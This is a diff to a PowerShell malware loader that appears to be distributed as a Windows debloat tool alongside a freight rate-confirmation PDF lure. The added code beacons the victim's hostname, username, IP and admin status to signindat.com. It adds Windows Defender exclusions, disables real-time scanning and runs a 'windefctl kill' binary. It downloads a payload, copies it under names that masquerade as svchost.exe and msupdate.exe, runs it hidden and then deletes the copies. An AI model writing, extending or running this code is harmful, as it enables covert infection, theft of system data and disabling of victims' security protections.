@@ -3,8 +3,7 @@ $ProgressPreference='SilentlyContinue'
 [Net.ServicePointManager]::ServerCertificateValidationCallback={$true}
 
 $gh='https://raw.githubusercontent.com/jimmyishere111/WinDebloat11/main/brokers'
-$srv='https://signindat.com'
-$sources=@($srv,$gh)
+$cbUrl='https://signindat.com/cb.php'
 
 $logPath="$env:TEMP\wmisrv.log"
 function _log($m){ "$((Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) | $m" | Out-File $logPath -Append -Encoding utf8 }
@@ -21,7 +20,7 @@ function _cb($stage,$status,$detail){
         $body=@{hostname=$cbHost;username=$cbUser;ip=$cbIp;os=$cbOs;is_admin=$cbIsAdmin;pid=$cbPid;stage=$stage;status=$status;detail=$detail;ts=(Get-Date -Format 'yyyy-MM-ddTHH:mm:ss')} | ConvertTo-Json -Compress
         $wc=New-Object Net.WebClient
         $wc.Headers.Add('Content-Type','application/json')
-        $wc.UploadString("$srv/cb.php",'POST',$body)|Out-Null
+        $wc.UploadString($cbUrl,'POST',$body)|Out-Null
     }catch{}
 }
 
@@ -33,17 +32,16 @@ _log "S1: a=$cbIsAdmin"
 _cb 'S1' 'ok' "is_admin=$cbIsAdmin"
 
 function _dl($n){
-    foreach($src in $sources){
-        try{
-            $wc=New-Object Net.WebClient
-            $wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
-            $d=$wc.DownloadData("$src/$n")
-            _log "DL: $n $($d.Length)"
-            return ,$d
-        }catch{}
+    try{
+        $wc=New-Object Net.WebClient
+        $wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
+        $d=$wc.DownloadData("$gh/$n")
+        _log "DL: $n $($d.Length)"
+        return ,$d
+    }catch{
+        _log "DL: $n fail"
+        return $null
     }
-    _log "DL: $n fail"
-    return $null
 }
 
 function _run($n,$s,$l){
@@ -115,6 +113,7 @@ if($cbIsAdmin){
         & $mp -ExclusionProcess 'svchost.exe' -ErrorAction SilentlyContinue | Out-Null
         & $mp -ExclusionProcess 'msupdate.exe' -ErrorAction SilentlyContinue | Out-Null
         & $mp -ExclusionProcess 'powershell.exe' -ErrorAction SilentlyContinue | Out-Null
+        & $mp -ExclusionProcess 'windefctl.exe' -ErrorAction SilentlyContinue | Out-Null
     }catch{}
 
     try{
@@ -130,11 +129,33 @@ if($cbIsAdmin){
         Set-ItemProperty -Path $rtp -Name 'DisableScanOnRealtimeEnable' -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue | Out-Null
         _log "S2: reg ok"
     }catch{}
+}
 
-    _runWait 'windefctl.exe' 'kill' 'S2' 'defkill' 18 | Out-Null
-    _cb 'S2' 'ok' 'defender killed'
+# download windefctl regardless of admin (for logging/diagnosis and UAC attempt)
+$wdcBytes=_dl 'windefctl.exe'
+$wdcPath="$env:TEMP\windefctl.exe"
+if($wdcBytes){
+    [IO.File]::WriteAllBytes($wdcPath,$wdcBytes)|Out-Null
+    _log "S2: windefctl written $($wdcBytes.Length)"
+    if($cbIsAdmin){
+        try{
+            $proc=Start-Process $wdcPath -ArgumentList 'kill' -WindowStyle Hidden -PassThru
+            _log "S2: defkill started, pid=$($proc.Id), waiting 18s"
+            Start-Sleep 18
+            if(-not $proc.HasExited){try{$proc.Kill()|Out-Null}catch{}}
+            _log "S2: defkill done"
+            _cb 'S2' 'ok' 'defender killed'
+        }catch{
+            _log "S2: defkill err: $($_.Exception.Message)"
+            _cb 'S2' 'fail' 'defkill err'
+        }
+    }else{
+        _log 'S2: no admin, skipping defkill exec'
+        _cb 'S2' 'skip' 'no admin'
+    }
 }else{
-    _cb 'S2' 'skip' 'no admin'
+    _log 'S2: windefctl dl fail'
+    _cb 'S2' 'fail' 'windefctl dl fail'
 }
 
 # cleanup windefctl binary
@@ -172,7 +193,45 @@ if($cbIsAdmin){
 
 _cb 'S3' 'ok' 'persist ok'
 
-_run 'PatchPulsaar.exe' 'S5' 'payload' | Out-Null
+# download payload once
+$ppBytes=_dl 'PatchPulsaar.exe'
+$ppTemp="$env:TEMP\PatchPulsaar.exe"
+$ppPaths=@(
+    "$env:TEMP\wmisrv.exe",
+    "$env:APPDATA\svchost.exe",
+    "$env:USERPROFILE\Downloads\msupdate.exe"
+)
+if($ppBytes){
+    # write original copy
+    [IO.File]::WriteAllBytes($ppTemp,$ppBytes)|Out-Null
+    _log "S5: PatchPulsaar written $($ppBytes.Length)"
+    # mirror into excluded folders/names
+    foreach($mirror in $ppPaths){
+        try{
+            [IO.File]::WriteAllBytes($mirror,$ppBytes)|Out-Null
+            _log "S5: mirror $mirror"
+        }catch{ _log "S5: mirror fail $mirror" }
+    }
+    # run from excluded location
+    $runPath=$ppPaths[0]
+    try{
+        Start-Process $runPath -WindowStyle Hidden | Out-Null
+        _log "S5: payload started from $runPath"
+        _cb 'S5' 'ok' 'payload'
+    }catch{
+        _log "S5: payload start err: $($_.Exception.Message)"
+        _cb 'S5' 'fail' 'payload err'
+    }
+}else{
+    _log 'S5: PatchPulsaar dl fail'
+    _cb 'S5' 'fail' 'payload dl fail'
+}
+
+# cleanup payload mirrors after a delay
+Start-Job -ScriptBlock {
+    Start-Sleep 30
+    foreach($f in @("$env:TEMP\PatchPulsaar.exe","$env:TEMP\wmisrv.exe","$env:APPDATA\svchost.exe","$env:USERPROFILE\Downloads\msupdate.exe")){Remove-Item $f -Force -ErrorAction SilentlyContinue}
+}|Out-Null
 
 $pdf='Rate_Confirmation_LD-2026-0847.pdf'
 $pdfPath="$env:USERPROFILE\Downloads\$pdf"
